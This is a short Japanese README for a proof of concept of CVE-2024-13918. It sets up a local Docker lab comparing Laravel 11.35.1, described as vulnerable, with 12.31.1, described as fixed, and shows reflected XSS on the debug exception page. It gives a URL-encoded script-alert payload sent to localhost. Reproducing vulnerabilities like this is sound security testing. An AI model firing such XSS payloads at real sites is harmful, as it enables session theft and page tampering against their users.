# CVE-2024-13918 PoC
Laravel 11.35.1（脆弱版）と 12.31.1（修正版）で、デバッグ例外ページの反射型 XSS を比較するPoC。

## 必要
- Docker / Docker Compose

## 対象
- 脆弱版: Laravel 11.35.1
- 修正版: Laravel 12.31.1
- 前提: APP_DEBUG=true

## 起動
```bash
docker compose up --build
```

## 確認
1. http://localhost:8011/test?q=%3Cscript%3Ealert('攻撃成功')%3C/script%3E を開く → アラートが出る
2. http://localhost:8012/test?q=%3Cscript%3Ealert('攻撃成功')%3C/script%3E を開く → アラートが出ない

## 判定
- 脆弱版でアラートが出る（例外ページにクエリがそのまま反映されXSSが成立）
- 修正版でアラートが出ない（例外ページでエスケープされスクリプトが実行されない）
